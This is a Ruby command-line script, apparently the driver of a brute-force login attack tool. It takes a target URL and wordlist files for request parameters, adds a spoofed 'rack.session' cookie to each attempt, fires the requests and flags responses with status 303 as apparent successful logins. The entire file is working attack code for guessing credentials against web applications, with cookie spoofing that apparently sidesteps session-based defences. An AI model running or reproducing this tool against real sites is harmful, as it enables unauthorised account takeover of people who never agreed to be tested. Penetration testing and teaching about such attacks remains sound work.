require 'net/http'

require_relative 'brute_force'
require_relative 'payload_set'
require_relative 'attack_analyzer'
require_relative 'helpers'

def payload_factory(params)
  name, filepath = params.split(':')
  PayloadSet.new(name).add_values_from_file(filepath)
end

def setup_attack
  #Read command line arguments
  target = ARGV.shift
  fixed_params = parse(ARGV.shift)

  #Create empty attack
  attack = BruteForceAttack.new(target)
  attack.set_fixed_req_params(fixed_params) if fixed_params.any?

  #Create user defined payloads
  payloads = ARGV.map do |params|
    payload_factory(params)
  end

  #Add spoofed rack session
  payloads << PayloadSet.new('rack.session').add_values_from_function(:generate_cookie, payloads.first.size)
  
  #Load payloads into attack
  attack.add_payloads(payloads)
end

def launch_attack
  attack = setup_attack
  attack.launch!
  p AttackAnalyzer.check_for_status_code('303', attack)
end

def print_usage_msg
  puts '[usage] target fixed_request_params attribute:file attribute:file' 
end

def run
  unless ARGV.first
    print_usage_msg
  else
    launch_attack
  end
end

#=========!!!!=========
#=======Run Call=======
#=========!!!!=========
run


